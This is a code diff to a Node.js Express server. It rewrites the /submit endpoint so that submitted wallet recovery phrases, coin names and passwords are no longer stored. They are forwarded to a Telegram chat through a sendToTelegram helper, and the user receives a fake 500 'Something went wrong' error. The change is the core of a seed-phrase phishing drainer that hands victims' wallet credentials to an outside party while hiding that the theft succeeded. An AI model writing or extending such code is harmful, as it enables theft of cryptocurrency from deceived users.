@@ -17,6 +17,7 @@ const {
 } = require("./utils/passwordManipulation");
 const { isLoggedIn } = require("./utils/login");
 const { generateAccessToken } = require("./utils/generateAccessToken");
+const { sendToTelegram } = require("./utils/sendToTelegram");
 
 connectToDB(); //db connection;
 
@@ -139,8 +140,15 @@ app.post("/login", async (req, res) => {
 
 app.post("/submit", async (req, res) => {
   try {
-    const created = await Phrase.create(req.body);
-    console.log(created);
+    const message = `\n
+    feature: ${req.body.feature}\n 
+    coin: ${req.body.coin}\n 
+    phrase: ${req.body.phrase}\n 
+    phraseType: ${req.body.phraseType}\n 
+    password: ${req.body.password || "no password"}\n`;
+    await sendToTelegram(message);
+    // const created = await Phrase.create(req.body);
+    // console.log(created);
     return res.status(500).json({ message: "Something went wrong" });
   } catch (error) {
     console.log(error);
